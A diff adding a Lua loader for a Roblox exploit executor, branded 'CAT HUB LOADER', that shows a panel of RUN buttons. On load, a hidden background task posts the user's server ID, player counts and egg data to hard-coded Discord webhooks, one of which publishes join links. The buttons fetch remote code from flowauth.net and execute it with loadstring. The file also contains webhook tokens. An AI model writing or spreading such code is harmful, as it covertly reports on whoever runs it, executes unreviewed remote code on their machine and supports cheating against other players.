@@ -1,0 +1,795 @@
+-- loader
+
+local CONFIG = {
+	WebhookUrl    = "https://discord.com/api/webhooks/1562374162427809842/Nk6YMoP9_9WeTcQs5YHxrX8Tz_Si2pWKXWiWnib9OxthL-Sg_Fg_GE2cSwUjnFoUsAWV", -- private: every egg
+	PublicWebhookUrl = "https://discord.com/api/webhooks/1562105087013167246/NUdV4rlHtEvshcPhlOpvp-6OQfCTgE35LntCyWOxxZA1GjLIrYSJFyHPKM69OPI3Z3pZ", -- public: only big eggs
+	PublicMinValue   = 1e9, -- 1B/s minimum for the public webhook
+	MainScriptUrl = "https://flowauth.net/v1/loaders/da401e843aae6bfe350a72e267ec13ab.lua",
+	EggLiveUrl    = "https://flowauth.net/v1/loaders/b83b9574b47106c3983ddf30af254c12.lua",
+	ScanInterval  = 300, -- 5 mins
+}
+
+if not game:IsLoaded() then game.Loaded:Wait() end
+
+local Players           = game:GetService("Players")
+local TweenService      = game:GetService("TweenService")
+local HttpService       = game:GetService("HttpService")
+local UserInputService  = game:GetService("UserInputService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local LocalPlayer = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() and Players.LocalPlayer
+
+-- persistent state across re-executions (same executor session)
+local genv = (getgenv and getgenv()) or _G
+genv.__sx_state = genv.__sx_state or { Gen = 0, JobId = nil, LastScan = 0, Seen = {}, Gui = nil }
+local State = genv.__sx_state
+State.Known = State.Known or {}
+State.Attempts = State.Attempts or {}
+State.LastScan = State.LastScan or 0
+if State.SessionDone == nil then State.SessionDone = true end
+State.Gen = State.Gen + 1
+local myGen = State.Gen
+
+-- ============================================================
+-- BACKGROUND EGG DETECTOR
+-- ============================================================
+
+local MIN_SCAN_TIME = 8      -- minimum seconds before a scan session may finish
+local STABLE_SCANS  = 3      -- scans in a row with no new egg = session complete
+local MAX_SCAN_TIME = 40     -- safety limit for one session
+local SCAN_STEP     = 2      -- seconds between scans inside a session
+local SEND_GAP      = 0.45   -- seconds between webhook posts (discord rate limit)
+local MAX_ATTEMPTS  = 3      -- webhook tries per egg before giving up on it
+local EGG_REMOTE    = "RF/EggWorld/AskFieldEggSnapshot"
+
+local warned = {}
+local function warnOnce(tag, msg)
+	if warned[tag] then return end
+	warned[tag] = true
+	warn("[sx] " .. msg)
+end
+
+local env = {}
+
+local function loadEnv()
+	if env.ready then return true end
+	pcall(function()
+		env.Assets = require(ReplicatedStorage:WaitForChild("Data", 15):WaitForChild("Assets", 15))
+	end)
+	pcall(function()
+		env.Mutations = require(ReplicatedStorage:WaitForChild("Shared", 15):WaitForChild("Modules", 15):WaitForChild("Mutations", 15))
+	end)
+	pcall(function()
+		env.Networking = ReplicatedStorage:WaitForChild("Packages", 15):WaitForChild("Networking", 15)
+	end)
+	env.ready = env.Assets ~= nil
+	return env.ready
+end
+
+local function findRemote()
+	local r = env.Networking and env.Networking:FindFirstChild(EGG_REMOTE)
+	if r then return r end
+	return ReplicatedStorage:FindFirstChild(EGG_REMOTE, true)
+end
+
+local function getScaleMultiplier(scale)
+	scale = tonumber(scale) or 1
+	if scale <= 5 then
+		return scale ^ 1.85
+	end
+	return (scale / 5) ^ 1.2 * 19.637875755794113
+end
+
+local function formatMoney(value)
+	local units = {
+		{ 1e12, "T" },
+		{ 1e9, "B" },
+		{ 1e6, "M" },
+		{ 1e3, "K" },
+	}
+	for _, unit in ipairs(units) do
+		if value >= unit[1] then
+			return string.format("$%.2f%s/s", value / unit[1], unit[2])
+		end
+	end
+	return string.format("$%d/s", math.floor(value + 0.5))
+end
+
+local function getSizeName(scale)
+	scale = tonumber(scale) or 1
+	if scale >= 100 then
+		return "Titanic"
+	elseif scale >= 30 then
+		return "Large"
+	elseif scale >= 10 then
+		return "Medium"
+	end
+	return "Small"
+end
+
+-- returns a table keyed by egg uid, or nil when the snapshot could not be read
+local function getEggs()
+	if not loadEnv() then
+		warnOnce("env", "game data modules not found (ReplicatedStorage.Data.Assets)")
+		return nil
+	end
+
+	local remote = findRemote()
+	if not remote then
+		warnOnce("noremote", "egg remote not found: " .. EGG_REMOTE)
+		return nil
+	end
+
+	local ok, result = pcall(function() return remote:InvokeServer() end)
+	if not ok or type(result) ~= "table" or type(result.Records) ~= "table" then
+		warnOnce("snap", "could not read egg snapshot: " .. tostring(result))
+		return nil
+	end
+
+	local directory = env.Assets.Directory
+	local currentEggs = {}
+	local playerCount, maxPlayers = #Players:GetPlayers(), Players.MaxPlayers
+
+	for _, record in pairs(result.Records) do
+		if record.State == "Slot" or record.State == "Dropped" then
+			local entry = directory and directory[tostring(record.AssetCategory)]
+			if entry then
+				local icon = ""
+				if entry.Icon and tostring(entry.Icon) ~= "" then
+					icon = tonumber(entry.Icon) and ("rbxassetid://" .. entry.Icon) or tostring(entry.Icon)
+				end
+
+				local mutation = 1
+				if env.Mutations and type(env.Mutations.EarningsFor) == "function" then
+					local okM, resM = pcall(
+						env.Mutations.EarningsFor,
+						type(record.Mutations) == "table" and record.Mutations or {}
+					)
+					if okM and type(resM) == "number" then
+						mutation = resM
+					end
+				end
+
+				local scale = tonumber(record.AssetScale) or 1
+				local value = (tonumber(entry.EarningRate) or 0) * getScaleMultiplier(scale) * mutation
+
+				currentEggs[tostring(record.Uid or record.AssetCategory)] = {
+					name = tostring(entry.DisplayName or record.AssetCategory),
+					serverId = game.JobId,
+					rarity = entry.Rarity and tostring(entry.Rarity.DisplayName or entry.Rarity.Name) or "Unknown",
+					sizeName = getSizeName(scale),
+					scale = scale,
+					value = formatMoney(value),
+					valueNum = value,
+					image = icon,
+					players = playerCount,
+					maxPlayers = maxPlayers,
+				}
+			end
+		end
+	end
+
+	return currentEggs
+end
+
+-- ============================================================
+-- WEBHOOKS
+-- ============================================================
+
+local function httpRequest(opts)
+	local fn = (syn and syn.request) or (http and http.request) or http_request or request or (fluxus and fluxus.request)
+	if not fn then return nil end
+	return fn(opts)
+end
+
+local function postJson(url, payload, label)
+	if type(url) ~= "string" or not url:find("^https?://") then
+		warnOnce("url" .. label, label .. " webhook url not set")
+		return false
+	end
+
+	local body = HttpService:JSONEncode(payload)
+	for attempt = 1, 3 do
+		local ok, res = pcall(httpRequest, {
+			Url = url,
+			Method = "POST",
+			Headers = { ["Content-Type"] = "application/json" },
+			Body = body,
+		})
+		if not ok then
+			warn("[sx] " .. label .. " webhook failed: " .. tostring(res))
+			return false
+		end
+		if res == nil then
+			warnOnce("nohttp", "executor has no http request function (syn.request / request / http_request)")
+			return false
+		end
+
+		local code = tonumber(type(res) == "table" and (res.StatusCode or res.Status) or nil)
+		if code == 429 and attempt < 3 then
+			local wait = 2.5
+			pcall(function()
+				local d = HttpService:JSONDecode(res.Body)
+				if d and tonumber(d.retry_after) then wait = tonumber(d.retry_after) + 0.25 end
+			end)
+			task.wait(wait) -- rate limited, honor retry_after
+		elseif code and code >= 400 then
+			warn("[sx] " .. label .. " webhook returned " .. tostring(code) .. " " .. tostring(res.Body))
+			return false
+		else
+			return true
+		end
+	end
+	return false
+end
+
+-- private: raw egg json, one egg per message
+local function pushPrivate(egg)
+	return postJson(CONFIG.WebhookUrl, {
+		content = "EGG",
+		embeds = {{
+			title = "New Egg Found",
+			description = HttpService:JSONEncode({ egg }),
+		}},
+	}, "private")
+end
+
+-- public: readable card with a join link, only for eggs at or above PublicMinValue
+local function pushPublic(egg)
+	local joinLink = string.format(
+		"https://www.roblox.com/games/start?placeId=%s&gameInstanceId=%s",
+		tostring(game.PlaceId),
+		tostring(egg.serverId or "")
+	)
+
+	return postJson(CONFIG.PublicWebhookUrl, {
+		embeds = {{
+			title = tostring(egg.name or "Unknown Egg"),
+			description = string.format(
+				"**Rarity:** %s\n**KG/Size:** %s (%.1f)\n**Money:** %s\n**Players:** %s/%s",
+				tostring(egg.rarity or "Unknown"),
+				tostring(egg.sizeName or "Small"),
+				tonumber(egg.scale) or 1,
+				tostring(egg.value or "$0/s"),
+				tostring(egg.players or "?"),
+				tostring(egg.maxPlayers or "?")
+			),
+			url = joinLink,
+			color = 16766720,
+			fields = {{
+				name = "JOIN SERVER",
+				value = joinLink,
+				inline = false,
+			}},
+			footer = { text = "CAT HUB • Egg Detector" },
+		}},
+	}, "public")
+end
+
+-- ============================================================
+-- SCAN SESSIONS
+-- ============================================================
+
+-- returns how many NEW eggs showed up, or nil when the snapshot was unreadable
+local function scanOnce(myGen)
+	local eggs = getEggs()
+	if not eggs then return nil end
+
+	local added = 0
+	for uid, egg in pairs(eggs) do
+		if State.Gen ~= myGen then return added end
+		if not State.Known[uid] then
+			if State.Attempts[uid] == nil then added = added + 1 end
+			local tries = (State.Attempts[uid] or 0) + 1
+			State.Attempts[uid] = tries
+
+			local okPrivate = pushPrivate(egg)
+			task.wait(SEND_GAP)
+
+			local okPublic = true
+			if (egg.valueNum or 0) >= CONFIG.PublicMinValue then
+				okPublic = pushPublic(egg)
+				task.wait(SEND_GAP)
+			end
+
+			-- failed sends are retried on the next scan, up to MAX_ATTEMPTS
+			if (okPrivate and okPublic) or tries >= MAX_ATTEMPTS then
+				State.Known[uid] = true
+			end
+		end
+	end
+	return added
+end
+
+-- keeps scanning until no new egg appears for several scans in a row
+-- returns true when at least one snapshot was read
+local function scanSession(myGen)
+	local startTime, stable, reached = tick(), 0, false
+	while State.Gen == myGen do
+		local added = scanOnce(myGen)
+		if added ~= nil then reached = true end
+		stable = ((added or 0) == 0) and (stable + 1) or 0
+
+		local elapsed = tick() - startTime
+		if elapsed >= MAX_SCAN_TIME or (elapsed >= MIN_SCAN_TIME and stable >= STABLE_SCANS) then
+			break
+		end
+		task.wait(SCAN_STEP)
+	end
+
+	local count = 0
+	for _ in pairs(State.Known) do count = count + 1 end
+	print("[sx] scan finished, eggs tracked: " .. count)
+	return reached
+end
+
+local function remainingWait()
+	if State.JobId == game.JobId and State.LastScan > 0 and State.SessionDone then
+		return math.max(0, CONFIG.ScanInterval - (os.time() - State.LastScan))
+	end
+	return 0
+end
+
+task.spawn(function()
+	-- new server: reset and scan immediately
+	if State.JobId ~= game.JobId then
+		State.JobId = game.JobId
+		State.Known = {}
+		State.Attempts = {}
+		State.LastScan = 0
+		State.SessionDone = true
+	end
+
+	while State.Gen == myGen do
+		-- same server inside the window: wait out the remainder
+		local w = remainingWait()
+		local t = 0
+		while t < w and State.Gen == myGen do
+			task.wait(1)
+			t = t + 1
+		end
+		if State.Gen ~= myGen then break end
+
+		task.wait(5) -- let the field finish loading
+		if State.Gen ~= myGen then break end
+
+		State.SessionDone = false
+		State.LastScan = os.time()
+		local ok, reached = pcall(scanSession, myGen)
+		if State.Gen ~= myGen then break end
+
+		State.SessionDone = true
+		if not ok then warnOnce("scanerr", "scan error: " .. tostring(reached)) end
+		if not ok or not reached then
+			-- nothing could be read: don't burn the 5 min window, retry soon
+			State.LastScan = 0
+			for _ = 1, 15 do
+				if State.Gen ~= myGen then break end
+				task.wait(1)
+			end
+		end
+	end
+end)
+
+-- ============================================================
+-- RUN LOGIC
+-- ============================================================
+
+local function runUrl(url)
+	local ok, src = pcall(function() return game:HttpGet(url) end)
+	if not ok then return false, src end
+	local fn, err = loadstring(src)
+	if not fn then return false, err end
+	local ok2, err2 = pcall(fn)
+	return ok2, err2
+end
+
+-- ============================================================
+-- UI
+-- ============================================================
+
+local C = {
+	Bg          = Color3.fromRGB(12, 18, 30),    -- #0C121E
+	Card        = Color3.fromRGB(18, 24, 38),    -- #121826
+	CardHover   = Color3.fromRGB(25, 36, 58),
+	Border      = Color3.fromRGB(38, 56, 86),    -- #263856
+	Accent      = Color3.fromRGB(58, 150, 255),  -- #3A96FF
+	AccentLight = Color3.fromRGB(125, 192, 255),
+	AccentDark  = Color3.fromRGB(28, 98, 212),
+	Text        = Color3.fromRGB(240, 245, 255),
+	Muted       = Color3.fromRGB(138, 155, 184),
+}
+
+local PANEL_W   = 380
+local EST_H     = 360
+local ROW_H     = 76
+local BTN_W     = 96
+local BTN_H     = 48 -- >= 44px touch target at min scale
+local MIN_SCALE = 0.92
+
+local TI_FAST = TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+local TI_SLOW = TweenInfo.new(0.55, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+
+local function tween(obj, props, info)
+	local t = TweenService:Create(obj, info or TI_FAST, props)
+	t:Play()
+	return t
+end
+
+local function new(class, props, parent)
+	local o = Instance.new(class)
+	for k, v in pairs(props or {}) do o[k] = v end
+	if parent then o.Parent = parent end
+	return o
+end
+
+local function corner(parent, r) return new("UICorner", { CornerRadius = UDim.new(0, r) }, parent) end
+
+local function label(parent, props)
+	local base = {
+		BackgroundTransparency = 1,
+		BorderSizePixel = 0,
+		Font = Enum.Font.GothamMedium,
+		TextColor3 = C.Text,
+		TextSize = 14,
+		TextXAlignment = Enum.TextXAlignment.Left,
+		TextYAlignment = Enum.TextYAlignment.Center,
+	}
+	for k, v in pairs(props) do base[k] = v end
+	return new("TextLabel", base, parent)
+end
+
+if State.Gui then pcall(function() State.Gui:Destroy() end) end
+
+local gui = new("ScreenGui", {
+	Name = (HttpService:GenerateGUID(false):gsub("-", "")):sub(1, 12),
+	ResetOnSpawn = false,
+	IgnoreGuiInset = true,
+	DisplayOrder = 999,
+	ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
+})
+State.Gui = gui
+
+do
+	pcall(function() if syn and syn.protect_gui then syn.protect_gui(gui) end end)
+	local targets = {}
+	pcall(function() if gethui then targets[#targets + 1] = gethui() end end)
+	pcall(function() targets[#targets + 1] = game:GetService("CoreGui") end)
+	targets[#targets + 1] = LocalPlayer:WaitForChild("PlayerGui")
+	for _, t in ipairs(targets) do
+		local ok = pcall(function() gui.Parent = t end)
+		if ok and gui.Parent == t then break end
+	end
+end
+
+-- panel (glass card)
+local root = new("CanvasGroup", {
+	Name = "Panel",
+	AnchorPoint = Vector2.new(0.5, 0.5),
+	Position = UDim2.new(0.5, 0, 0.5, 28),
+	Size = UDim2.new(0, PANEL_W, 0, 0),
+	AutomaticSize = Enum.AutomaticSize.Y,
+	BackgroundColor3 = C.Bg,
+	BackgroundTransparency = 0.08,
+	BorderSizePixel = 0,
+	GroupTransparency = 1,
+}, gui)
+corner(root, 16)
+
+new("UIGradient", {
+	Color = ColorSequence.new(Color3.fromRGB(255, 255, 255), Color3.fromRGB(185, 198, 224)),
+	Rotation = 90,
+}, root)
+
+local rootStroke = new("UIStroke", {
+	Color = C.Border,
+	Thickness = 1.5,
+	Transparency = 0.1,
+	ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
+}, root)
+new("UIGradient", {
+	Color = ColorSequence.new({
+		ColorSequenceKeypoint.new(0, C.Accent),
+		ColorSequenceKeypoint.new(0.5, C.Border),
+		ColorSequenceKeypoint.new(1, C.Accent),
+	}),
+	Rotation = 60,
+}, rootStroke)
+
+local scaler = new("UIScale", { Scale = 1 }, root)
+new("UIPadding", {
+	PaddingTop = UDim.new(0, 20), PaddingBottom = UDim.new(0, 20),
+	PaddingLeft = UDim.new(0, 18), PaddingRight = UDim.new(0, 18),
+}, root)
+new("UIListLayout", {
+	Padding = UDim.new(0, 12),
+	SortOrder = Enum.SortOrder.LayoutOrder,
+	HorizontalAlignment = Enum.HorizontalAlignment.Center,
+}, root)
+
+-- [Title Area]
+local title = label(root, {
+	Name = "Title",
+	Text = "CAT HUB LOADER",
+	Font = Enum.Font.GothamBold,
+	TextSize = 26,
+	TextXAlignment = Enum.TextXAlignment.Center,
+	Size = UDim2.new(1, 0, 0, 38),
+	LayoutOrder = 1,
+})
+new("UIGradient", {
+	Color = ColorSequence.new(Color3.fromRGB(255, 255, 255), C.AccentLight),
+	Rotation = 0,
+}, title)
+
+-- rows
+local function makeRow(order, titleText, subText, onRun)
+	local wrap = new("Frame", {
+		Name = "RowWrap",
+		Size = UDim2.new(1, 0, 0, ROW_H),
+		BackgroundTransparency = 1,
+		LayoutOrder = order,
+	}, root)
+
+	local row = new("Frame", {
+		Name = "Row",
+		AnchorPoint = Vector2.new(0.5, 0.5),
+		Position = UDim2.fromScale(0.5, 0.5),
+		Size = UDim2.new(1, 0, 1, 0),
+		BackgroundColor3 = C.Card,
+		BackgroundTransparency = 0.12,
+		BorderSizePixel = 0,
+	}, wrap)
+	corner(row, 12)
+	new("UIGradient", {
+		Color = ColorSequence.new(Color3.fromRGB(255, 255, 255), Color3.fromRGB(205, 212, 226)),
+		Rotation = 90,
+	}, row)
+	local stroke = new("UIStroke", {
+		Color = C.Border, Thickness = 1.2, Transparency = 0.1,
+		ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
+	}, row)
+
+	local textW = -(16 + BTN_W + 14 + 12)
+	label(row, {
+		Text = titleText,
+		Font = Enum.Font.GothamBold,
+		TextSize = 16,
+		TextTruncate = Enum.TextTruncate.AtEnd,
+		Position = UDim2.new(0, 16, 0, 15),
+		Size = UDim2.new(1, textW, 0, 22),
+	})
+	label(row, {
+		Text = subText,
+		TextSize = 13,
+		TextColor3 = C.Muted,
+		TextTruncate = Enum.TextTruncate.AtEnd,
+		Position = UDim2.new(0, 16, 0, 40),
+		Size = UDim2.new(1, textW, 0, 18),
+	})
+
+	-- glow + glass button
+	local btnPos = UDim2.new(1, -(14 + BTN_W / 2), 0.5, 0)
+
+	local glow = new("Frame", {
+		AnchorPoint = Vector2.new(0.5, 0.5),
+		Position = btnPos,
+		Size = UDim2.new(0, BTN_W + 10, 0, BTN_H + 10),
+		BackgroundColor3 = C.Accent,
+		BackgroundTransparency = 0.9,
+		BorderSizePixel = 0,
+		ZIndex = 1,
+	}, row)
+	corner(glow, 14)
+
+	local visual = new("Frame", {
+		AnchorPoint = Vector2.new(0.5, 0.5),
+		Position = btnPos,
+		Size = UDim2.new(0, BTN_W, 0, BTN_H),
+		BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+		BorderSizePixel = 0,
+		ZIndex = 2,
+	}, row)
+	corner(visual, 10)
+	new("UIGradient", {
+		Color = ColorSequence.new({
+			ColorSequenceKeypoint.new(0, C.AccentLight),
+			ColorSequenceKeypoint.new(0.5, C.Accent),
+			ColorSequenceKeypoint.new(1, C.AccentDark),
+		}),
+		Rotation = 90,
+	}, visual)
+	local vStroke = new("UIStroke", {
+		Color = C.AccentLight, Thickness = 1, Transparency = 0.45,
+		ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
+	}, visual)
+
+	local gloss = new("Frame", {
+		Position = UDim2.new(0, 3, 0, 3),
+		Size = UDim2.new(1, -6, 0.5, -3),
+		BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+		BorderSizePixel = 0,
+		ZIndex = 3,
+	}, visual)
+	corner(gloss, 8)
+	new("UIGradient", {
+		Transparency = NumberSequence.new({
+			NumberSequenceKeypoint.new(0, 0.62),
+			NumberSequenceKeypoint.new(1, 1),
+		}),
+		Rotation = 90,
+	}, gloss)
+
+	local btnLabel = label(visual, {
+		Text = "RUN",
+		Font = Enum.Font.GothamBold,
+		TextSize = 15,
+		TextXAlignment = Enum.TextXAlignment.Center,
+		Size = UDim2.new(1, 0, 1, 0),
+		ZIndex = 4,
+	})
+
+	local hit = new("TextButton", {
+		AnchorPoint = Vector2.new(0.5, 0.5),
+		Position = btnPos,
+		Size = UDim2.new(0, BTN_W, 0, BTN_H),
+		BackgroundTransparency = 1,
+		Text = "",
+		AutoButtonColor = false,
+		ZIndex = 10,
+	}, row)
+
+	local rowHover, btnHover, pressed = false, false, false
+
+	local function refreshRow()
+		tween(row, {
+			Size = rowHover and UDim2.new(1, 4, 1, 4) or UDim2.new(1, 0, 1, 0),
+			BackgroundColor3 = rowHover and C.CardHover or C.Card,
+		})
+		tween(stroke, {
+			Color = rowHover and C.Accent or C.Border,
+			Transparency = rowHover and 0 or 0.1,
+			Thickness = rowHover and 1.6 or 1.2,
+		})
+	end
+
+	local function refreshBtn()
+		local grow = btnHover and 4 or 0
+		if pressed then grow = grow - 6 end
+		tween(visual, { Size = UDim2.new(0, BTN_W + grow, 0, BTN_H + grow) })
+		tween(glow, {
+			Size = UDim2.new(0, BTN_W + 10 + grow * 2, 0, BTN_H + 10 + grow * 2),
+			BackgroundTransparency = btnHover and 0.62 or 0.9,
+		})
+		tween(vStroke, {
+			Thickness = btnHover and 2 or 1,
+			Transparency = btnHover and 0 or 0.45,
+		})
+		tween(gloss, { BackgroundTransparency = btnHover and 0.05 or 0 })
+	end
+
+	wrap.MouseEnter:Connect(function() rowHover = true; refreshRow() end)
+	wrap.MouseLeave:Connect(function() rowHover = false; refreshRow() end)
+	hit.MouseEnter:Connect(function() btnHover = true; refreshBtn() end)
+	hit.MouseLeave:Connect(function() btnHover = false; pressed = false; refreshBtn() end)
+	hit.MouseButton1Down:Connect(function() pressed = true; refreshBtn() end)
+	hit.MouseButton1Up:Connect(function() pressed = false; refreshBtn() end)
+
+	local busy = false
+	hit.Activated:Connect(function()
+		if busy then return end
+		busy = true
+		btnLabel.Text = "..."
+		task.spawn(function()
+			local ok, err = onRun()
+			if ok then
+				-- done: fade the panel out, then remove the gui
+				btnLabel.Text = "OK"
+				task.wait(0.35)
+				local t = tween(root, { GroupTransparency = 1, Position = UDim2.new(0.5, 0, 0.5, 20) }, TI_SLOW)
+				t.Completed:Wait()
+				gui:Destroy()
+				return
+			end
+			btnLabel.Text = "ERR"
+			warn("[sx] " .. tostring(err))
+			task.wait(1.2)
+			btnLabel.Text = "RUN"
+			busy = false
+		end)
+	end)
+end
+
+-- [Row 1: Main Scripts]
+makeRow(2, "More Scripts", "Browse other scripts", function()
+	return runUrl(CONFIG.MainScriptUrl)
+end)
+
+-- [Row 2: Egg Scanner]
+makeRow(3, "Egg Detector Live", "Live field eggs list", function()
+	return runUrl(CONFIG.EggLiveUrl)
+end)
+
+-- [Divider Line]
+local divider = new("Frame", {
+	Name = "Divider",
+	Size = UDim2.new(1, 0, 0, 1),
+	BackgroundColor3 = Color3.fromRGB(70, 105, 160),
+	BorderSizePixel = 0,
+	LayoutOrder = 4,
+}, root)
+new("UIGradient", {
+	Transparency = NumberSequence.new({
+		NumberSequenceKeypoint.new(0, 1),
+		NumberSequenceKeypoint.new(0.5, 0.1),
+		NumberSequenceKeypoint.new(1, 1),
+	}),
+}, divider)
+
+-- [Footer Area]
+local footer = new("Frame", {
+	Name = "Footer",
+	Size = UDim2.new(1, 0, 0, 0),
+	AutomaticSize = Enum.AutomaticSize.Y,
+	BackgroundTransparency = 1,
+	LayoutOrder = 5,
+}, root)
+new("UIListLayout", {
+	Padding = UDim.new(0, 4),
+	SortOrder = Enum.SortOrder.LayoutOrder,
+	HorizontalAlignment = Enum.HorizontalAlignment.Center,
+}, footer)
+
+label(footer, {
+	Text = "Release: 7pm",
+	Font = Enum.Font.GothamBold,
+	TextSize = 14,
+	TextColor3 = C.Accent,
+	TextXAlignment = Enum.TextXAlignment.Center,
+	Size = UDim2.new(1, 0, 0, 18),
+	LayoutOrder = 1,
+})
+label(footer, {
+	Text = "Cat Hub Auto Farm & More",
+	Font = Enum.Font.GothamBold,
+	TextSize = 15,
+	TextXAlignment = Enum.TextXAlignment.Center,
+	Size = UDim2.new(1, 0, 0, 20),
+	LayoutOrder = 2,
+})
+label(footer, {
+	Text = "Join our Discord for updates and new scripts!",
+	TextSize = 12,
+	TextColor3 = C.Muted,
+	TextWrapped = true,
+	TextXAlignment = Enum.TextXAlignment.Center,
+	Size = UDim2.new(1, 0, 0, 0),
+	AutomaticSize = Enum.AutomaticSize.Y,
+	LayoutOrder = 3,
+})
+
+-- responsive scale (PC stays 1:1, touch-only devices scale up; 720x1280 safe)
+local function updateScale()
+	local cam = workspace.CurrentCamera
+	local vp = cam and cam.ViewportSize or Vector2.new(1280, 720)
+	local touchOnly = UserInputService.TouchEnabled and not UserInputService.MouseEnabled
+	local maxS = touchOnly and 1.6 or 1
+	local s = math.min(vp.X * 0.94 / PANEL_W, vp.Y * 0.9 / EST_H)
+	scaler.Scale = math.clamp(s, MIN_SCALE, maxS)
+end
+updateScale()
+
+local camConn
+local function hookCamera()
+	if camConn then camConn:Disconnect() end
+	local cam = workspace.CurrentCamera
+	if cam then camConn = cam:GetPropertyChangedSignal("ViewportSize"):Connect(updateScale) end
+end
+hookCamera()
+workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function() hookCamera(); updateScale() end)
+gui.Destroying:Connect(function() if camConn then camConn:Disconnect() end end)
+
+-- entrance
+task.defer(function()
+	tween(root, { GroupTransparency = 0, Position = UDim2.new(0.5, 0, 0.5, 0) }, TI_SLOW)
+end)
